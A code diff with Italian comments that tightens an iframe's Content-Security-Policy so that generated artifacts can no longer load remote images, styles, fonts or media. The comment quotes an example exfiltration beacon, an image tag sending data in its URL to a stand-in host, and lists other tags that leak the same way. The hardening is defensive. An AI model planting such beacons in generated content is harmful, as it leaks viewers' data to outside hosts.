@@ -39,11 +39,33 @@
  *  leggibile; una pagina A4 di solo testo ne richiederebbe ~0,42 e no. */
 export const MIN_ZOOM_INTERO = 0.45;
 
-/** CSP dell'iframe: nessuna rete se non immagini e stili, nessun frame. */
+/** CSP dell'iframe: **nessuna rete**, né in entrata né in uscita. Solo ciò che
+ *  l'artefatto porta con sé (`data:`, `blob:`) e ciò che scrive inline.
+ *
+ *  Prima ammetteva `https:` su `img-src`, `style-src`, `font-src` e `media-src`.
+ *  Una richiesta di risorsa **è un canale**: `<img src="https://x/leak?d=…">`
+ *  parte dal browser dell'owner, con la sua rete e la sua uscita, e non serve
+ *  nessuna risposta per aver consegnato i dati — sta tutto nell'URL. Un
+ *  artefatto è contenuto GENERATO: chi lo scrive non è chi lo guarda, ed è la
+ *  ragione per cui gira in un iframe a origine opaca. Lasciargli un GET verso
+ *  qualunque host annulla metà di quel confinamento (clodia-platform#175, riga
+ *  #108).
+ *
+ *  Le quattro direttive si tolgono INSIEME: chiudere solo `img-src` sposta il
+ *  canale, non lo chiude — `<video src>`, un `@font-face` remoto o un
+ *  `<link rel=stylesheet>` fanno lo stesso GET con lo stesso effetto. Il resto
+ *  (`connect-src`, `frame-src`, `form-action`) resta coperto da
+ *  `default-src 'none'`.
+ *
+ *  Costo dichiarato: un artefatto che referenzia un'immagine, un CSS o un font
+ *  remoto non li carica più. Le immagini che la piattaforma produce sono già
+ *  `data:`/`blob:` (vedi `/preview`, dove il markdown incorpora i byte), quindi
+ *  il caso che si perde è la risorsa di terzi — cioè esattamente quella che non
+ *  vogliamo far chiedere dal browser di chi legge. */
 export const CSP =
 	'<meta http-equiv="Content-Security-Policy" content="' +
-	"default-src 'none'; img-src data: blob: https:; style-src 'unsafe-inline' https:; " +
-	"script-src 'unsafe-inline'; font-src data: https:; media-src data: blob: https:" +
+	"default-src 'none'; img-src data: blob:; style-src 'unsafe-inline'; " +
+	"script-src 'unsafe-inline'; font-src data:; media-src data: blob:" +
 	'">';
 
 export const FIT =
